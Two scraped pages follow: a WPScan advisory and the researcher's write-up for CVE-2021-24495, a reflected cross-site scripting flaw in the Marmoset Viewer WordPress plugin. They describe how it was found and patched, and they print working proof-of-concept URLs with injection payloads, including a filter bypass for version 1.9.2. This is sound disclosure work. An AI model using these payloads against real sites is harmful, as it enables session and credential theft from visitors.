=== Content from wpscan.com_abcc876e_20250115_090653.html ===


[Skip to content](#wp--skip-link--target)

* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

## WordPress Plugin Vulnerabilities

# Marmoset Viewer < 1.9.3 - Reflected Cross Site Scripting

### Description

The plugin does not property sanitize, validate or escape the 'id' parameter before outputting back in the page, leading to a reflected Cross-Site Scripting issue.

### Proof of Concept

https://example.com/wp-content/plugins/marmoset-viewer/mviewer.php?id=http://%3C/script%3E%3Csvg/onload=alert(1)%3E
(WPScanTeam) Reporter mentioned issue fixed in 1.9.2, but there was a bypass
v < 1.9.3
https://example.com/wp-content/plugins/marmoset-viewer/mviewer.php?id=1+http://a.com%27);alert(/XSS/);marmoset.embed(%27a

### Affects Plugins

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

marmoset-viewer](https://a8cteam5105.wordpress.com/plugin/marmoset-viewer/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 1.9.3

### References

CVE
[CVE-2021-24495](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24495)

URL
<https://johnjhacking.com/blog/cve-2021-24495-improper-neutralization-of-input-during-web-page-generation-on-id-parameter-in-wordpress-marmoset-viewer-plugin-versions-1.9.3-leads-to-reflected-cross-site-scripting/>

### Classification

Type
XSS

OWASP top 10
[A7: Cross-Site Scripting (XSS)](https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_%28XSS%29)

CWE
[CWE-79](https://cwe.mitre.org/data/definitions/79.html)

CVSS
[7.1 (high)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L)

### Miscellaneous

Original Researcher
John Jackson

Submitter
John Jackson

Submitter website
<https://johnjhacking.com>

Submitter twitter
[johnjhacking](//twitter.com/johnjhacking)

Verified
Yes

WPVDB ID
[d11b79a3-f762-49ab-b7c8-3174624d7638](https://a8cteam5105.wordpress.com/vulnerability/d11b79a3-f762-49ab-b7c8-3174624d7638/)

### Timeline

Publicly Published
2021-07-06 (about 3 years ago)

Added
2021-07-12 (about 3 years ago)

Last Updated
2022-02-06 (about 2 years ago)

### Other

Published
Title

Published
2024-05-01
Title
[IDonate < 2.0.0 - Admin+ Stored XSS](https://a8cteam5105.wordpress.com/vulnerability/7a8a834a-e5d7-4678-9d35-4390d1200437/)

Published
2024-11-05
Title
[Active Products Tables for WooCommerce. Use constructor to create tables < 1.0.6.5 - Authenticated (Contributor+) Stored Cross-Site Scripting via woot\_button Shortcode](https://a8cteam5105.wordpress.com/vulnerability/77fb7859-4f8f-4298-b24a-2653eb65a490/)

Published
2024-07-23
Title
[AMP for WP – Accelerated Mobile Pages < 1.0.97 - Authenticated (Author+) Stored Cross-Site Scripting via SVG File Upload](https://a8cteam5105.wordpress.com/vulnerability/ec25678c-615e-4c55-89b0-d90fa7c75c3f/)

Published
2015-09-06
Title
[WP Symposium <= 15.8.1 - Unauthenticated Reflected Cross-Site Scripting (XSS)](https://a8cteam5105.wordpress.com/vulnerability/2ac2d43f-bf3f-4831-9585-5c5484051095/)

Published
2021-02-06
Title
[Wyzi < 2.4.3 - Reflected Cross-Site Scripting (XSS)](https://a8cteam5105.wordpress.com/vulnerability/157a9a76-3e5f-4d27-aefc-cb9cb88b3286/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com)
  + [View site in Reader](https://wordpress.com/read/feeds/156197069)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)


=== Content from johnjhacking.com_8f54b4a5_20250115_090652.html ===


* [Home](/)
* [Blog](/blog)
* [Research](/research)

* [Home](https://johnjhacking.com)
* [Blog](/blog)
* [Research](/research)

# CVE-2021-24495: Improper Neutralization of Input During Web Page Generation on ‘id’ parameter in Wordpress Marmoset Viewer Plugin versions 1.9.3 ≤ leads to Reflected Cross Site Scripting

A reflected cross site scripting vulnerability exists on the ‘id’ parameter of the Wordpress Marmoset Viewer plugin. A threat actor can utilize a specially crafted payload and append it to the id parameter included in the Marmoset Viewer. The cross site scripting vulnerability can lead to the potential theft of cookies or credentials, giving the threat actor the ability to take over a victim’s account or steal other sensitive information.

Published on Jul 06, 2021

Reading time: 3 minutes.

---

# Credits

**John**

Github: [https://github.com/johnjhacking](https://github.com/johnjhacking "https://github.com/johnjhacking")

**Jackson Henry [Helped simplify the payload]**

Twitter: [https://twitter.com/JacksonHHax](https://twitter.com/JacksonHHax "https://twitter.com/JacksonHHax")

**Wabaf3t [Provided post-code analysis/looked for escalation]**

Twitter: [https://twitter.com/wabafet1](https://twitter.com/wabafet1 "https://twitter.com/wabafet1")

**Kelly Kaoudis [Reviewed the writeup]**

Twitter: [https://twitter.com/kaoudis](https://twitter.com/kaoudis "https://twitter.com/kaoudis")

**Robert Willis** **[Reviewed the writeup]**

Twitter: [https://twitter.com/rej\_ex](https://twitter.com/rej_ex "https://twitter.com/rej_ex")

**Erwan [Identified bypass]**

Twitter: [https://twitter.com/erwan\_lr](https://twitter.com/erwan_lr "https://twitter.com/erwan_lr")

# Identification

During research, a marmoset viewer was identified as running on a WordPress application. The URL looks like this:

**<https://example.com/wp-content/plugins/marmoset-viewer/mviewer.php?width=640&height=360&autostart=1&transparantbg=1&nui=1&id=https:/example.com/wp-content/uploads/2020/02/Golems_v2.mview>**

As seen, there are several parameters, however, while viewing the code on the main page, you can see the following:

![](/uploads/wp2.png)

The marmoset.embed function comes from the main php file, mviewer.php, which is the source code for the actual viewer. The embed function is executed as a script that loads the mview file model with specifications defined within the embed function. If you look at the URL, you can see that the mview file is being served from the /wp-content/uploads/ directory.

![](/uploads/wp1.png)

# Exploitation

The original payload utilized was:

**http://foo%3C/Script%3E%3CImg/Src/OnError=(prompt)(document.domain)%3E**

After appending the payload to the parameter, the final exploit looked like this:

**<http://example.com/wp-content/plugins/marmoset-viewer/mviewer.php?width=900px&height=700px&autostart=1&transparantbg=&nui=&id=http://foo%3C/Script%3E%3CImg/Src/OnError=(prompt)(document.domain)%3E>**

As seen, the above URL executed reflected XSS.

![](/uploads/wp3.png)

The URL was long, and even though it’s typically the standard URL that is utilized throughout the various deployments, there was room for improvement. After consulting with Jackson Henry, the URL was redacted to only include the ‘id’ parameter for ease of exploitation, in conjunction with a payload that alerts instead:

**<https://example.com/wp-content/plugins/marmoset-viewer/mviewer.php?id=http://%3C/script%3E%3Csvg/onload=alert(1)%3E>**

![](/uploads/ref.png)

After the patch, the vendor released version 1.9.2 which remediated this issue. However, while working with WPScan to receive the assignment of a CVE through MITRE for the vulnerability, they had observed a bypass payload:

**<https://example.com/wp-content/plugins/marmoset-viewer/mviewer.php?id=1+http://a.com%27);alert(/XSS/);marmoset.embed(%27a>

![](/uploads/ref2.png)**

The above payload, discovered by Erwan, worked on versions 1.9.2 and below, making it an effective bypass. The vendor then pushed out plugin version 1.9.3 to remediate the issue.

# Impact

*“Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.*

*An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page.”*

**Reference: <https://owasp.org/www-community/attacks/xss/>**

# Post Analysis & Patching

Marmoset was contacted initially and then got me in touch with the WordPress Plugin maintainer. In less than 24 hours the patch was implemented after several rounds of testing. Ultimately, the changes included:

1. Implementing a php sanitization filter on the ‘id’ parameter.

2. Modifying marmoset.embed to utilizing an htmlentities php function instead of the original URL function for more restrictive usage on URLs that are not included within the application.

**mviewer.php code changes**

![](/uploads/wp4.png)

After the bypass was discovered by Erwan, a small change was required to remediate it:

![](/uploads/wp5.png)

This change expanded the character sanitization set by utilizing the Filter\_Sanitize\_URL function instead of the Full\_Special\_Chars function. Additionally, the ENT\_Quotes function converts single and double quotes.

**Reference:**

***1.9.2***

**<https://plugins.trac.wordpress.org/changeset?old_path=%2Fmarmoset-viewer%2Ftags%2F1.9.1&old=2556046&new_path=%2Fmarmoset-viewer%2Ftags%2F1.9.2&new=2556046&sfp_email=&sfph_mail=>

*1.9.3***

**<https://plugins.trac.wordpress.org/changeset?old_path=%2Fmarmoset-viewer%2Ftags%2F1.9.2%2Fmviewer.php&old=2556571&new_path=%2Fmarmoset-viewer%2Ftags%2F1.9.3%2Fmviewer.php&new=2556571&sfp_email=&sfph_mail=>**

![Creative Commons](https://mirrors.creativecommons.org/presskit/icons/cc.svg)
![CC-BY](https://mirrors.creativecommons.org/presskit/icons/by.svg)
2020
John


